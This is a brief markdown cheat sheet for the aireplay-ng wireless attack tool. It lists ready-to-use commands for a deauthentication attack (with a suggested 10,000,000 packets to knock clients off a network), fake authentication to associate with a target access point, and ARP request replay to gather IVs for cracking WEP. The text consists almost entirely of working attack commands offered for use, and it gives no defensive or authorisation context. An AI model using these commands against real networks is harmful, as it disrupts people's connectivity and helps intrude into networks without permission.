# aireplay-ng

* Part of the _aircrack-ng_ suit.

## Deauthentication Attack

* Works on encrypted networks (WEP, WPA & WPA2).
* No need to know network's key or connect to the network.

Try the following command with `PACKET_AMOUNT = 10000000`.

```
aireplay-ng --deauth <PACKET_AMOUNT> -a <TARGET_NETWORK_BSSID> -c <TARGET_STATION/CLIENT_MAC> <MONITOR_IF>
```

If the command fails, run `airodump-ng` along with it, to sniff network with the `--target` flag.

## Fake Authentication

1. Sniff packets
2. Use fake auth to associate with network and allow sending packets to network

```
aireplay-ng --fakeauth <REPS=0> -a <TARGET_MAC> -h <MY_INTERFACE_MAC> <MONITOR_INTERFACE_NAME>
```

## ARP Request Replay Attack

Replaying ARP packets causes the AP to produce another packet with a new IV, which is usefull for cracking WEP.

```
aireplay-ng --arpreplay -b <TARGET_MAC> -h <MY_INTERFACE_MAC> <MONITOR_INTERFACE_NAME> 
```
